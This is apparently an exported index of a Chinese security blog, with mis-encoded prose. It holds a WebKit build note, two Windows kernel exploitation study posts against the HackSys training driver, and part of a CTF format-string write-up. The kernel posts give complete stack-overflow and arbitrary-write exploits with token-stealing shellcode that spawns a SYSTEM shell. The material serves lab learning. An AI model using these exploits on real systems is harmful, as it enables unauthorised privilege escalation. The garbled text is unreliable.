/System/Library/Frameworks/JavaScriptCore.framework/Versions/A/JavaScriptCore in /Users/muhe/Code/webkit/WebKitBuild/./Debug/jsc[1] 64039 abort ./Debug/jsc æœäº†å¾ˆå¤šéƒ½æ— æœ(å¯èƒ½å…³é”®è¯é—®é¢˜)ï¼Œé—®äº†0x9kå¸ˆå‚…ä¹‹åå¾—åˆ°äº†è§£å†³æ–¹æ¡ˆï¼ŒåŸæ¥å®˜ç½‘å°±æœ‰è§£ç­” å›§ è§£å†³æ–¹æ³•æ˜¯ï¼šè®¾ç½®DYLD_FRAMEWORK_PATHç¯å¢ƒå˜é‡ã€‚ 1export DYLD_FRAMEWORK_PATH=/Users/muhe/Code/webkit/WebKitBuild/Debug ä¹‹åå°±å¯ä»¥æ­£å¸¸è¿è¡Œäº†: 123456$ ./Debug/jsc&gt;&gt;&gt; var test = &quot;Hello jsc&quot;;undefined&gt;&gt;&gt; testHello jsc&gt;&gt;&gt;","link":"/2018/12/31/Webkit%E7%BC%96%E8%AF%91%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/"},{"title":"Windows Kernel Exploit Study(1)","text":"0x00:ä¹‹å‰åœ¨ä¸€ä¸ªå°ç¾¤é‡Œjokerå¸ˆå‚…ç»™å¤§å®¶æ¨èäº†ä¸€æ³¢Windows Kernel Exploitï¼Œè¿™ä¸ªå…¥é—¨çº§çš„windows kernel pwnçš„èµ„æ–™ï¼Œæ­£å¥½è·Ÿç€å­¦ä¹ ä¸€ä¸‹å†…æ ¸ç›¸å…³çš„çŸ¥è¯†ã€‚ 0x01: ç¯å¢ƒ æ‰€ç”¨ç³»ç»Ÿè¯´æ˜ ç‰©ç†æœº ï¼šwindows10 è™šæ‹Ÿæœº ï¼šxp sp3 cn è¿‡ç¨‹ä¸­ç”¨åˆ°çš„å·¥å…· Visual Studio 2010 Windbg ProcessExplorer osrloaderv30 0x02: å‰æœŸå‡†å¤‡é¦–å…ˆæ˜¯åŒæœºè°ƒè¯•å’Œé©±åŠ¨åŠ è½½çš„é—®é¢˜ã€‚åŒæœºè°ƒè¯•çš„è¯ï¼Œé¦–å…ˆä¿®æ”¹xpçš„boot.iniæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åœ¨ï¼šC:\\boot.iniã€‚æ·»åŠ è°ƒè¯•ç›¸å…³çš„é€‰é¡¹ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ç›´æ¥åŠ äº†ä¸€ä¸ªå¯åŠ¨é¡¹ï¼Œå¦‚å›¾ï¼šç„¶ååœ¨vmwareé‡Œç»™xpè™šæ‹ŸæœºåŠ ä¸€ä¸ªä¸²å£å°±å¯ä»¥äº†ï¼Œé…ç½®å¦‚ä¸‹å›¾ï¼šç„¶åï¼Œè¿›å…¥windbgï¼Œé€‰æ‹©ï¼šFileâ€“Kernel Debugï¼Œé€‰ä¸­COMæ ï¼Œå¡«å†™ç›¸åº”çš„ç®¡é“çš„ä¿¡æ¯ï¼Œç„¶åå°±å¯ä»¥å¼€å§‹è°ƒè¯•äº†ã€‚ æƒ³è¦æ–­ä¸‹æ¥ç„¶åå•æ­¥å¯ä»¥ç›´æ¥ï¼šDebugâ€”â€”â€”Breakï¼Œè¿™æ ·å°±å¯ä»¥æ–­ä¸‹æ¥äº†ã€‚ä¹‹åä½¿ç”¨osrloaderv30å·¥å…·å»åŠ è½½ç›®æ ‡é©±åŠ¨ã€‚ 0x03: åˆ†æå¼€å§‹åªæ˜¯å‡†å¤‡å°è¯•ä¸‹æœ€ç®€å•çš„Stackoverflow vulnå»ææƒï¼Œå…³äºè¿™éƒ¨åˆ†ï¼Œé©±åŠ¨çš„æºç å¦‚ä¸‹ï¼šè¿™é‡Œåªè´´å‡ºæ¥æ´¾é£ä¾‹ç¨‹éƒ¨åˆ†çš„ä»£ç ï¼Œæ¼æ´å¾ˆæ˜æ˜¾ï¼Œå†…æ ¸é‡Œç›´æ¥ä½¿ç”¨äº†ç”¨æˆ·å±‚ä¼ è¿›æ¥çš„sizeè¿›è¡Œæ‹·è´å·¥ä½œï¼Œè€Œæ²¡æœ‰åšä»»ä½•çš„checkï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚ 12345678910111213141516171819202122232425262728293031323334353637NTSTATUS TriggerStackOverflow(IN PVOID UserBuffer, IN SIZE_T Size) { NTSTATUS Status = STATUS_SUCCESS; ULONG KernelBuffer[BUFFER_SIZE] = {0}; PAGED_CODE(); __try { // Verify if the buffer resides in user mode ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer)); DbgPrint(\"[+] UserBuffer: 0x%p\\n\", UserBuffer); DbgPrint(\"[+] UserBuffer Size: 0x%X\\n\", Size); DbgPrint(\"[+] KernelBuffer: 0x%p\\n\", &amp;KernelBuffer); DbgPrint(\"[+] KernelBuffer Size: 0x%X\\n\", sizeof(KernelBuffer));#ifdef SECURE // Secure Note: This is secure because the developer is passing a size // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence, // there will be no overflow RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));#else DbgPrint(\"[+] Triggering Stack Overflow\\n\"); // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability // because the developer is passing the user supplied size directly to // RtlCopyMemory()/memcpy() without validating if the size is greater or // equal to the size of KernelBuffer RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);#endif } __except (EXCEPTION_EXECUTE_HANDLER) { Status = GetExceptionCode(); DbgPrint(\"[-] Exception Code: 0x%X\\n\", Status); } return Status;} æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªdemoå»è§¦å‘è¿™ä¸ªæ¼æ´ï¼Œç„¶åä½¿ç”¨Tokenæ›¿æ¢çš„æ€è·¯å»ææƒã€‚æ ¹æ®WEK.pdfçš„ä¾‹ç¨‹ï¼Œdemoå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// bof_demo.cpp : Defines the entry point for the console application.//#include \"stdafx.h\"#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;winioctl.h&gt;#include &lt;TlHelp32.h&gt;#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_NEITHER,FILE_READ_DATA | FILE_WRITE_DATA)//#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)int _tmain(int argc,_TCHAR* argv[]){ DWORD lpBytesReturned; PVOID pMemoryAddress = NULL; PULONG lpInBuffer = NULL; LPCSTR lpDeviceName = (LPCSTR) \"\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\"; SIZE_T nInBufferSize = 768 * sizeof(ULONG); //SIZE_T nInBufferSize = 1024 * sizeof(ULONG); printf(\"[*]Getting the device handle\\r\\n\"); HANDLE hDriver = CreateFileA(lpDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf(\"[*]Failed to get device handle : (0x%X\\r\\n)\",GetLastError()); return 1; } printf(\"[*]Got the device Handle : 0x%X\\r\\n\", hDriver); printf(\"[*]Allocating Memory For Input Buffer\\r\\n\"); lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize); if (!lpInBuffer) { printf(\"[*]HeapAlloc failed :(0x%X\\r\\n)\",GetLastError()); return 1; } printf(\"[*]Input buffer allocated as 0x%X bytes.\\r\\n\",nInBufferSize); printf(\"[*]Input buffer address : 0x%p\\r\\n\",lpInBuffer); printf(\"[*]Filling buffer with A's\\r\\n\"); //char *data = \"junk for get bof length....\"; //memcpy(lpInBuffer,data,nInBufferSize); RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, 0x41); printf(\"[*]Send IOCTL request\\r\\n\"); DeviceIoControl(hDriver, HACKSYS_EVD_IOCTL_STACK_OVERFLOW, (LPVOID)lpInBuffer, (DWORD)nInBufferSize, NULL, 0, &amp;lpBytesReturned, NULL); printf(\"[*]IOCTL request completed,cleaning up da heap.\\r\\n\"); HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer); return 0;} è¿™æ®µä»£ç ä¹Ÿå¾ˆç®€å•ï¼Œè‡ªå®šä¹‰çš„bufferå’Œsizeï¼Œç„¶åä¼ é€’ç»™ç›®æ ‡é©±åŠ¨çš„Stackoverflowçš„æ´¾é£ä¾‹ç¨‹ã€‚ 0x04: è¿‡ç¨‹ä¸‹é¢å°±å¯ä»¥å¼€å§‹å…ˆå»ç¡®å®šbofçš„é•¿åº¦äº†ï¼Œä½¿ç”¨kaliä¸‹çš„pattern_createå’Œpattern_offsetå·¥å…·ï¼Œä»–ä»¬çš„è·¯å¾„åœ¨kali2ä¸‹æ˜¯ï¼š/usr/share/metasploit-framework/tools/exploitã€‚ä¿®æ”¹ä¸Šè¿°æºç éƒ¨åˆ†ï¼š 12char *data = \"result of ./pattern_create.rb -l 3506\";memcpy(lpInBuffer,data,nInBufferSize); é‡æ–°ç¼–è¯‘demo_bofï¼Œç„¶åè¿è¡Œã€‚å´©æºƒäº†ï¼Œeipè¢«è¦†ç›–æˆäº†junkå­—ç¬¦ï¼Œç„¶åç¡®å®šåç§»ï¼špayloadåº”è¯¥æ˜¯ï¼š2080 bytes + sc addr ç»å…¸çš„TokenStealingShellcodeå¦‚ä¸‹ï¼š æ„é€ å‡ºæ¥çš„exploitå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include \"stdafx.h\"#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;winioctl.h&gt;#include &lt;TlHelp32.h&gt;//#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\\ METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\\ METHOD_NEITHER, FILE_ANY_ACCESS)#define KTHREAD_OFFSET 0x124#define EPROCESS_OFFSET 0x044#define PID_OFFSET 0x084#define FLINK_OFFSET 0x088#define TOKEN_OFFSET 0x0c8#define SYSTEM_PID 0x004VOID TokenStealingShellcodeWin() { __asm { pushad mov eax, fs:[KTHREAD_OFFSET] mov eax, [eax + EPROCESS_OFFSET] mov ecx, eax mov ebx, [eax + TOKEN_OFFSET] mov edx, SYSTEM_PID SearchSystemPID : mov eax, [eax + FLINK_OFFSET] sub eax, FLINK_OFFSET cmp[eax + PID_OFFSET], edx jne SearchSystemPID mov edx, [eax + TOKEN_OFFSET] mov[ecx + TOKEN_OFFSET], edx popad ; recovery xor eax, eax; set NTSTATUS SUCEESS add esp, 12; fix stack pop ebp ret 8 }}int _tmain(int argc, _TCHAR* argv[]) { DWORD lpBytesReturned; PVOID pMemoryAddress = NULL; //PULONG lpInBuffer = NULL; LPCSTR lpDeviceName = (LPCSTR) \"\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\"; //SIZE_T nInBufferSize = 1024 * sizeof(ULONG); printf(\"Getting the device handle\\r\\n\"); HANDLE hDriver = CreateFileA(lpDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf(\"Failed to get device handle : (0x%X\\r\\n)\", GetLastError()); return 1; } printf(\"Got the device Handle : 0x%X\\r\\n\", hDriver); printf(\"Allocating Memory For Input Buffer\\r\\n\"); /* lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize); if (!lpInBuffer) { printf(\"HeapAlloc failed :(0x%X\\r\\n)\",GetLastError()); return 1; } printf(\"Input buffer allocated as 0x%X bytes.\\r\\n\",nInBufferSize); printf(\"Input buffer address : 0x%p\\r\\n\",lpInBuffer); printf(\"Filling buffer with A's\\r\\n\"); */ //RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, 0x41); printf(\"\\t[*]Payload is at : %p\\n\", TokenStealingShellcodeWin); //junk's length is 2080 CHAR *chBuffer = (CHAR*)malloc(2084); printf(\"\\t[*]Buffer is at : %p\\n\", &amp;chBuffer); memset(chBuffer, 0x41, 2048); memset(chBuffer + 2048, 0x42, 32); chBuffer[2080] = (DWORD)&amp;TokenStealingShellcodeWin &amp; 0x000000FF; chBuffer[2080 + 1] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; 0x0000FF00) &gt;&gt; 8; chBuffer[2080 + 2] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; 0x00FF0000) &gt;&gt; 16; chBuffer[2080 + 3] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; 0xFF000000) &gt;&gt; 24; printf(\"Send IOCTL request\\r\\n\"); DeviceIoControl(hDriver, HACKSYS_EVD_IOCTL_STACK_OVERFLOW, chBuffer, 2084, NULL, 0, &amp;lpBytesReturned, NULL); system(\"cmd.exe\"); printf(\"IOCTL request completed,cleaning up da heap.\\r\\n\"); //HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer); CloseHandle(hDriver); return 0;} é‡æ–°ç¼–è¯‘åè¿è¡Œexploitç¨‹åºã€‚å› ä¸ºæˆ‘è¿™ä¸ªxpåœ¨å®‰è£…çš„æ—¶å€™æ²¡æœ‰è£…whoamiå·¥å…·ï¼Œæ‰€ä»¥åœ¨çœ‹æˆ‘ä½¿ç”¨äº†ProcessExploreræ¥çœ‹æ–°å¯åŠ¨çš„cmdçš„æƒé™ä¿¡æ¯ã€‚åœ¨è¿è¡Œexploitä¹‹å‰è¿è¡ŒexploitæˆåŠŸæ‹¿åˆ°æœ€é«˜æƒé™ã€‚ 0x05ï¼šå…³äºshell codeçš„åˆ†ææƒ³è¦åˆ†æshellcodeæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œç›´æ¥åœ¨å®ƒæœ€å‰é¢åŠ ä¸€ä¸ªint 3ç„¶åé‡æ–°ç¼–è¯‘ï¼Œå†æŠŠexploitè·‘èµ·æ¥ï¼Œwindbgé‡Œåˆ†æå°±å¥½äº†ã€‚å‰é¢è¯´åˆ°è¿™ä¸ªè·å–tokenè¦æ‰¾åˆ°EPROCESSç»“æ„ã€‚ ç„¶è€Œwindowsæœ‰ä¸ªAPI PsGetCurrentProcesså¯ä»¥è·å–åŒ…å«EPROCESSç»“æ„çš„processå¯¹è±¡ã€‚åæ±‡ç¼–çœ‹ä¸‹è¿™ä¸ªAPIçš„å®ç°ï¼š ä½¿ç”¨dt -b -v _EPROCESSæŸ¥çœ‹EPROCESSç»“æ„ã€‚ä¹‹å‰åœ¨shellcodeä¸­çœ‹åˆ°çš„ä¸€äº›æ•°æ®çš„å®šä¹‰ï¼Œéƒ½å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ã€‚ä¸‹é¢æ¥åˆ†ææˆ‘ä»¬è¿™æ®µshellcodeçš„å·¥ä½œã€‚å•æ­¥è‡³æ­¤ï¼Œè·å¾—å½“å‰è¿›ç¨‹çš„EPROCESSç»“æ„æŒ‡é’ˆä¿å­˜åœ¨ecxå¾…ç”¨ã€‚ä¸‹é¢è¿›å…¥å¾ªç¯å¯»æ‰¾SYSTEM_PID,ç„¶åè·å–å…¶tokenï¼šè¿™ä¸ªå¾ªç¯è·‘çš„æ¬¡æ•°æŒºå¤šï¼Œæˆ‘ç›´æ¥ä¸‹æ–­è·³å‡ºå¾ªç¯æ¥ç€åˆ†æï¼Œè¿™é‡Œæ¥åˆ°tokenæ›¿æ¢çš„éƒ¨åˆ†ï¼šä¹‹åç›´æ¥popadå¼¹å‡ºä¹‹å‰ä¿å­˜çš„å¯„å­˜å™¨çš„å€¼ï¼Œç„¶åå›åˆ°åŸæ¥çš„ä»£ç å»æ‰§è¡Œï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„è¿›ç¨‹(demo_bof)çš„tokenå·²ç»æ˜¯systemè¿›ç¨‹çš„tokenäº†ï¼Œè¿™ä¸ªæ—¶å€™ç›´æ¥èµ·ä¸€ä¸ªcmdï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªæœ€é«˜æƒé™çš„shelläº†ã€‚è¿™ä¸ªæ—¶å€™F5ï¼Œè™šæ‹Ÿæœºé‚£è¾¹å°±å·²ç»èµ·æ¥ä¸€ä¸ªsystem32çš„cmdäº†ã€‚ 0x06: å‚è€ƒä¸å¼•ç”¨Windows Kernel Exploitlhs0kå¸ˆå‚…çš„å¸®åŠ©","link":"/2017/01/19/Windows-Kernel-Exploit-Study-1/"},{"title":"Windows Kernel Exploit Study(2)","text":"0x00:ç¬¬äºŒéƒ¨åˆ†å…³äºä»»æ„åœ°å€å†™ç±»å‹æ¼æ´åˆ©ç”¨çš„demoã€‚ 0x01: ç¯å¢ƒç›¸å…³ç¯å¢ƒå’Œå‰ä¸€ç¯‡æ–‡ç« ä¸­çš„ç¯å¢ƒé…ç½®ç›¸åŒã€‚ 0x02ï¼šé©±åŠ¨åŠdemoä»£ç é©±åŠ¨ä¸­çš„ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/// &lt;summary&gt;/// Trigger the Arbitrary Overwrite Vulnerability/// &lt;/summary&gt;/// &lt;param name=\"UserWriteWhatWhere\"&gt;The pointer to WRITE_WHAT_WHERE structure&lt;/param&gt;/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;NTSTATUS TriggerArbitraryOverwrite(IN PWRITE_WHAT_WHERE UserWriteWhatWhere) { PULONG What = NULL; PULONG Where = NULL; NTSTATUS Status = STATUS_SUCCESS; PAGED_CODE(); __try { // Verify if the buffer resides in user mode ProbeForRead((PVOID)UserWriteWhatWhere, sizeof(WRITE_WHAT_WHERE), (ULONG)__alignof(WRITE_WHAT_WHERE)); What = UserWriteWhatWhere-&gt;What; Where = UserWriteWhatWhere-&gt;Where; DbgPrint(\"[+] UserWriteWhatWhere: 0x%p\\n\", UserWriteWhatWhere); DbgPrint(\"[+] WRITE_WHAT_WHERE Size: 0x%X\\n\", sizeof(WRITE_WHAT_WHERE)); DbgPrint(\"[+] UserWriteWhatWhere-&gt;What: 0x%p\\n\", What); DbgPrint(\"[+] UserWriteWhatWhere-&gt;Where: 0x%p\\n\", Where);#ifdef SECURE // Secure Note: This is secure because the developer is properly validating if address // pointed by 'Where' and 'What' value resides in User mode by calling ProbeForRead() // routine before performing the write operation ProbeForRead((PVOID)Where, sizeof(PULONG), (ULONG)__alignof(PULONG)); ProbeForRead((PVOID)What, sizeof(PULONG), (ULONG)__alignof(PULONG)); *(Where) = *(What);#else DbgPrint(\"[+] Triggering Arbitrary Overwrite\\n\"); // Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability // because the developer is writing the value pointed by 'What' to memory location // pointed by 'Where' without properly validating if the values pointed by 'Where' // and 'What' resides in User mode *(Where) = *(What);#endif } __except (EXCEPTION_EXECUTE_HANDLER) { Status = GetExceptionCode(); DbgPrint(\"[-] Exception Code: 0x%X\\n\", Status); } return Status;} å¯ä»¥çœ‹åˆ°è¿™ä¸ªä»£ç å¾ˆç®€å•ç²—æš´ï¼Œç”¨æˆ·ç©ºé—´æ¥æ”¶Whatå’ŒWhereï¼Œç„¶åå‘WhereæŒ‡å®šçš„åœ°å€å†™Whatå†…å®¹ã€‚æ ¹æ®Windows Kernel Exploitè¿™ä¸ªæ–‡æ¡£ä¸­ç»™å‡ºçš„æ€è·¯ï¼Œè¦†ç›–HalDispatchTable + 4ä½ç½®ä¸ºtokenstealinshellcodeçš„åœ°å€ï¼Œç„¶åè§¦å‘è¿™ä¸ªå†…å­˜è¦†ç›–ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥ææƒäº†ã€‚ä¸‹é¢æ˜¯demoçš„ä»£ç ï¼Œä¸ºäº†ç¼–è¯‘é€šè¿‡ï¼Œæœ‰äº›åœ°æ–¹åšäº†ç•¥å¾®çš„æ”¹åŠ¨ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196#include \"stdafx.h\"#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;winioctl.h&gt;#include &lt;TlHelp32.h&gt;#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN,0x802,\\ METHOD_NEITHER, FILE_ANY_ACCESS)#define KTHREAD_OFFSET 0x124#define EPROCESS_OFFSET 0x044#define PID_OFFSET 0x084#define FLINK_OFFSET 0x088#define TOKEN_OFFSET 0x0c8#define SYSTEM_PID 0x004VOID TokenStealingShellcodeWin() { __asm { pushad mov eax, fs:[KTHREAD_OFFSET] mov eax, [eax + EPROCESS_OFFSET] mov ecx, eax mov ebx, [eax + TOKEN_OFFSET] mov edx, SYSTEM_PID SearchSystemPID : mov eax, [eax + FLINK_OFFSET] sub eax, FLINK_OFFSET cmp[eax + PID_OFFSET], edx jne SearchSystemPID mov edx, [eax + TOKEN_OFFSET] mov[ecx + TOKEN_OFFSET], edx popad }}typedef struct _WRITE_WHAT_WHERE { PULONG What; PULONG Where;}WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;typedef enum { SystemBasicInformation, SystemProcessorInformation, SystemPerformanceInformation, SystemTimeOfDayInformation, SystemPathInformation, SystemProcessInfomation, SystemCallCountInformation, SystemDeviceInformation, SystemProcessorPerformanceInformation, SystemFlagsInformation, SystemCallTimeInformation, SystemModuleInformation}SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;typedef struct { PVOID Reserved1; PVOID Reserved2; PVOID Base; ULONG ImageSize; ULONG Flags; WORD Id; WORD Rank; WORD w108; WORD NameOffset; CHAR imageName[256];}SYSTEM_MODULE, *PSYSTEM_MODULE;typedef struct { ULONG ModulesCount; SYSTEM_MODULE Modules[0];}SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;typedef NTSTATUS(WINAPI *NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS, \\ OUT PVOID SystemInformation, \\ IN ULONG SystemInformationLength, OUT PULONG ReturnLength);typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(IN ULONG ProfileSource, \\ OUT PULONG Interval);int _tmain(int argc, _TCHAR* argv[]) { PWRITE_WHAT_WHERE WriteWhatWhere = NULL; PVOID HalDispatchTabel = NULL; PVOID HalDispatchTabel4 = NULL; HMODULE ntoskrnl = NULL; PVOID kernelBase = NULL; HMODULE ntdll = NULL; //function NtQuerySystemInformation_t NtQuerySystemInformation; ////////////////////////////////////////////////////////////////// NTSTATUS Ntstatus = 0xc0000001; SIZE_T ReturnLength; PSYSTEM_MODULE_INFORMATION pSystemModuleInformation; PCHAR KernelImage; PVOID KernelBaseAddressInKernelMode; HMODULE hKernelInUserMode = NULL; PVOID EopPayload = &amp;TokenStealingShellcodeWin; ////////////////////////////////////////////////////////////////// NtQueryIntervalProfile_t NtQueryIntervalProfile; ULONG Interval = 0; ////////////////////////////////////////////////////////////////// DWORD lpBytesReturned; PVOID pMemoryAddress = NULL; PULONG IpInBuffer = NULL; LPCSTR lpDeviceName = (LPCSTR) \"\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\"; printf(\"Getting the device handle\\r\\n\"); HANDLE hDriver = CreateFileA(lpDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf(\"Failed to get device handle : (0x%X\\r\\n)\", GetLastError()); return 1; } printf(\"Got the device Handle : 0x%X\\r\\n\", hDriver); WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(), \\ HEAP_ZERO_MEMORY, \\ sizeof(WRITE_WHAT_WHERE)); //Step 3. ntdll = GetModuleHandle(L\"ntdll.dll\"); NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdll, \\ \"NtQuerySystemInformation\"); Ntstatus = NtQuerySystemInformation(SystemModuleInformation, \\ NULL, \\ 0, \\ &amp;ReturnLength); pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), \\ HEAP_ZERO_MEMORY, \\ ReturnLength); Ntstatus = NtQuerySystemInformation(SystemModuleInformation, \\ pSystemModuleInformation, \\ ReturnLength, \\ &amp;ReturnLength); KernelBaseAddressInKernelMode = pSystemModuleInformation-&gt;Modules[0].Base; KernelImage = strrchr((PCHAR)pSystemModuleInformation-&gt;Modules[0].imageName, '\\\\') + 1; //Step 1 and 2: printf(\"KernelImage : %s\\n\", KernelImage); hKernelInUserMode = LoadLibraryA(KernelImage); HalDispatchTabel = (PVOID)GetProcAddress(hKernelInUserMode, \"HalDispatchTabel\"); //Step 4: HalDispatchTabel = (PVOID)((ULONG)HalDispatchTabel - (ULONG)hKernelInUserMode); HalDispatchTabel = (PVOID)((ULONG)HalDispatchTabel + (ULONG)KernelBaseAddressInKernelMode); HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation); FreeLibrary(ntdll); FreeLibrary(hKernelInUserMode); //end HalDispatchTabel4 = (PVOID)((ULONG)HalDispatchTabel + sizeof(PVOID)); WriteWhatWhere-&gt;What = (PULONG)&amp;EopPayload; WriteWhatWhere-&gt;Where = (PULONG)HalDispatchTabel4; printf(\"\\t[*]Where : 0x%p\\n\", WriteWhatWhere-&gt;Where); printf(\"\\t[*]What : 0x%p\\n\", WriteWhatWhere-&gt;What); printf(\"\\t[*]Exp : 0x%p\\n\", EopPayload); printf(\"Send IOCTL request\\r\\n\"); DeviceIoControl(hDriver, HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE, (LPVOID)WriteWhatWhere, sizeof(WriteWhatWhere), NULL, 0, &amp;lpBytesReturned, NULL); //triger the memory overwrite ntdll = LoadLibraryA(\"ntdll.dll\"); NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(ntdll, \"NtQueryIntervalProfile\"); NtQueryIntervalProfile(0x1337, &amp;Interval); HeapFree(GetProcessHeap(), 0, (LPVOID)WriteWhatWhere); system(\"cmd.exe\"); printf(\"IOCTL request completed,cleaning up da heap.\\r\\n\"); CloseHandle(hDriver); return 0;} ä»£ç åœ¨è¿™é‡Œ 0x03: Exploitåœ¨è¿è¡Œexp.exeä¹‹å‰ è¿è¡Œä¹‹å 0x04ï¼šå‚è€ƒä¸å¼•ç”¨Windows Kernel Exploit","link":"/2017/01/20/Windows-Kernel-Exploit-Study-2/"},{"title":"cctf pwn350","text":"0x00:ä¹‹å‰æ‰“äº†CCTFï¼Œåœ¨CCTFçš„è¿‡ç¨‹ä¸­é‡åˆ°ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„æ€è·¯ï¼Œè®°å½•ä¸€ä¸‹ã€‚ 0x01:å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ˜¯ä¸€ä¸ª fmt çš„æ¼æ´ï¼Œä¸è¿‡å¾ˆç®€å•ï¼Œæ¥æ”¶çš„è¾“å…¥éƒ½åœ¨stackä¸­ï¼Œå¯ä»¥ç¡®å®šè¾“å…¥åœ¨æ ˆä¸­çš„ä½ç½®ï¼Œå¯ä»¥åšåˆ° ä»»æ„åœ°å€è¯»å†™ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå¯¹äºè¿™ç§ç±»å‹çš„æ¼æ´ï¼Œå†™shellcodeåˆ°åˆé€‚çš„åœ°å€ç„¶åè·³è½¬è¿‡å»ï¼Œæˆ–è€…leak å‡º systemåœ°å€ï¼Œæ”¹å…¶ä»–å‡½æ•°çš„gotï¼Œéƒ½æ˜¯å¯ä»¥æ‹¿ä¸€ä¸ªshellçš„ã€‚æœ¬æ¥ï¼Œæˆ‘çš„æ€è·¯å¾ˆçª„ï¼Œæƒ³çš„æ˜¯æ„é€ ä¸€ä¸ªå¾ªç¯ï¼Œå»leakæˆ‘éœ€è¦çš„å‡½æ•°ï¼Œç„¶åæ”¹gotå»æ‹¿shellã€‚jokerå¸ˆå‚…æç‚¹äº†æˆ‘ä¸€ä¸‹ï¼Œå¯ä»¥leakä»»æ„ä¸¤ä¸ªå‡½æ•°åœ°å€ï¼Œç„¶åå» libcdb.com æŸ¥ä¸€æ³¢libcçš„ç‰ˆæœ¬ï¼Œå°±å¯ä»¥ç¡®å®šlibcç‰ˆæœ¬ï¼Œä»è€Œå¾—åˆ°systemçš„åç§»ã€‚ 0x02:ç»¼ä¸Šåˆ©ç”¨æ€è·¯å°±æ˜¯ï¼Œleakå‡ºä»»æ„ä¸¤ä¸ªå‡½æ•°åœ°å€ï¼Œç„¶åç¡®å®šsystem()çš„åç§»ï¼Œæ”¹æ‰puts@got,æ„é€ putsè°ƒç”¨çš„å‚æ•°ä¸º/bin/sh 